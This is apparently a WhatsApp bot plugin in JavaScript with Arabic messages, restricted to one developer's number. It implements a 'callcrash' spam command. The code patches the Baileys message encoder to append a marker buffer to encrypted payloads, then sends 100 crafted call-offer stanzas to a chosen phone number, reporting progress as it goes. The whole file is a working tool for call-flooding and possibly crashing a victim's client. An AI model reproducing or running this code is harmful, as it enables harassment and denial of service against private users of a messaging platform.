let handler = async (m, { conn, text, usedPrefix, command }) => {
  // رقم المطور فقط
  let developerNumber = '201022950118@s.whatsapp.net';
  
  // التحقق من أن المستخدم هو المطور
  if (m.sender !== developerNumber) {
    return m.reply(
`╔═━━••【⚠️】••━━═╗
✦ هذا الأمر حصري للمطور ✦
✦ فقط @201022950118 يمكنه استخدامه ✦
╚═━━••【⚠️】••━━═╝`,
      null,
      { mentions: [developerNumber] }
    );
  }

  if (!text) return m.reply(`⚠️ مثال: ${usedPrefix + command} 20×××`);

  let target = text.replace(/[^0-9]/g, '');
  if (target.length < 8) return m.reply('❌ رقم غير صالح');
  
  let targetJid = target + '@s.whatsapp.net';

  await m.reply(
`╔═━━••【📞】••━━═╗
✦ جاري تنفيذ ${command} ✦
✦ على ↜ @${target} ✦
✦ العدد ↜ 100 مكالمة ✦
✦ المنفذ ↜ @201022950118 ✦
╚═━━••【📞】••━━═╝`,
    null,
    { mentions: [targetJid, '201022950118@s.whatsapp.net'] }
  );

  // دالة إرسال المكالمات من الكود الأصلي
  async function callCrash(target, isVideo = false) {
    const {
      jidDecode, 
      encodeWAMessage,
      encodeSignedDeviceIdentity
    } = await import("@whiskeysockets/baileys");
    const crypto = await import('crypto');
  
    try {
      const devices = (
        await conn.getUSyncDevices([target], false, false)
      ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

      await conn.assertSessions(devices);

      const createMutex = () => {
        const locks = new Map();
        return {
          async mutex(key, fn) {
            while (locks.has(key)) {
              await locks.get(key);
            }
            const lock = Promise.resolve().then(() => fn());
            locks.set(key, lock);
            try {
              const result = await lock;
              return result;
            } finally {
              locks.delete(key);
            }
          }
        };
      };

      const mutexManager = createMutex();
    
      const appendBufferMarker = (buffer) => {
        const newBuffer = Buffer.alloc(buffer.length + 8);
        buffer.copy(newBuffer);
        newBuffer.fill(1, buffer.length);
        return newBuffer;
      };

      const originalCreateParticipantNodes = conn.createParticipantNodes?.bind(conn);
      const originalEncodeWAMessage = conn.encodeWAMessage?.bind(conn);

      conn.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) {
          return {
            nodes: [],
            shouldIncludeDeviceIdentity: false
          };
        }

        const processedMessage = await (conn.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
        const messagePairs = Array.isArray(processedMessage) 
          ? processedMessage 
          : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

        const { id: meId, lid: meLid } = conn.authState.creds.me;
        const localUser = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        const nodes = await Promise.all(
          messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
            const { user: targetUser } = jidDecode(jid);
            const { user: ownUser } = jidDecode(meId);
            const isOwnUser = targetUser === ownUser || targetUser === localUser;
            const isSelf = jid === meId || jid === meLid;
          
            if (dsmMessage && isOwnUser && !isSelf) {
              msg = dsmMessage;
            }

            const encodedBytes = appendBufferMarker(
              originalEncodeWAMessage 
                ? originalEncodeWAMessage(msg) 
                : encodeWAMessage(msg)
            );

            return mutexManager.mutex(jid, async () => {
              const { type, ciphertext } = await conn.signalRepository.encryptMessage({ 
                jid, 
                data: encodedBytes 
              });
            
              if (type === 'pkmsg') {
                shouldIncludeDeviceIdentity = true;
              }
            
              return {
                tag: 'to',
                attrs: { jid },
                content: [{
                  tag: 'enc',
                  attrs: {
                    v: '2',
                    type,
                    ...extraAttrs
                  },
                  content: ciphertext
                }]
              };
            });
          })
        );

        return {
          nodes: nodes.filter(Boolean),
          shouldIncludeDeviceIdentity
        };
      };

      const callKey = crypto.randomBytes(32);
      const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
      const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

      const { nodes: destinations, shouldIncludeDeviceIdentity } = 
        await conn.createParticipantNodes(devices, { 
          conversation: "call-initiated"
        }, { count: '0' });

      const callStanza = {
        tag: "call",
        attrs: {
          to: target,
          id: conn.generateMessageTag(),
          from: conn.user.id
        },
        content: [{
          tag: "offer",
          attrs: {
            "call-id": callId,
            "call-creator": conn.user.id
          },
          content: [
            {
              tag: "audio",
              attrs: {
                enc: "opus",
                rate: "16000"
              }
            },
            {
              tag: "audio",
              attrs: {
                enc: "opus",
                rate: "8000"
              }
            },
            ...(isVideo ? [{
              tag: 'video',
              attrs: {
                enc: 'vp8',
                dec: 'vp8',
                orientation: '0',
                screen_width: '1920',
                screen_height: '1080',
                device_orientation: '0'
              }
            }] : []),
            {
              tag: "net",
              attrs: {
                medium: "3"
              }
            },
            {
              tag: "capability",
              attrs: { ver: "1" },
              content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
            },
            {
              tag: "encopt",
              attrs: { keygen: "2" }
            },
            {
              tag: "destination",
              attrs: {},
              content: destinations
            },
            ...(shouldIncludeDeviceIdentity ? [{
              tag: "device-identity",
              attrs: {},
              content: encodeSignedDeviceIdentity(conn.authState.creds.account, true)
            }] : [])
          ].filter(Boolean)
        }]
      };

      await conn.sendNode(callStanza);
      return true;

    } catch (error) {
      console.error('Error in callCrash:', error);
      return false;
    }
  }

  let successCount = 0;
  let failCount = 0;

  // تنفيذ 100 مكالمة
  for (let i = 0; i < 100; i++) {
    try {
      const result = await callCrash(targetJid, false);
      if (result) {
        successCount++;
      } else {
        failCount++;
      }
      
      // تحديث التقدم كل 10 مكالمات
      if ((i + 1) % 10 === 0) {
        await m.reply(`📊 تقدم: ${i + 1}/100 مكالمة\n✅ نجاح: ${successCount}\n❌ فشل: ${failCount}`);
      }
      
      // تأخير بسيط بين المكالمات
      await new Promise(resolve => setTimeout(resolve, 500));
    } catch (e) {
      failCount++;
      console.error(e);
    }
  }

  // رسالة النهاية
  await m.reply(
`╔═━━••【✅】••━━═╗
✦ تم تنفيذ ${command} بنجاح ✦
✦ على ↜ @${target} ✦
✦ ✅ نجاح: ${successCount} مكالمة ✦
✦ ❌ فشل: ${failCount} مكالمة ✦
✦ المنفذ ↜ @201022950118 ✦
╚═━━••【✅】••━━═╝`,
    null,
    { mentions: [targetJid, '201022950118@s.whatsapp.net', m.sender] }
  );
};

handler.command = ['سبام2', 'callcrash'];  // ✅ تغيير اسم الأمر إلى سبام2
handler.tags = ['developer'];
handler.help = ['سبام2 <رقم>'];  // ✅ تغيير المساعدة
handler.rowner = true;

export default handler;
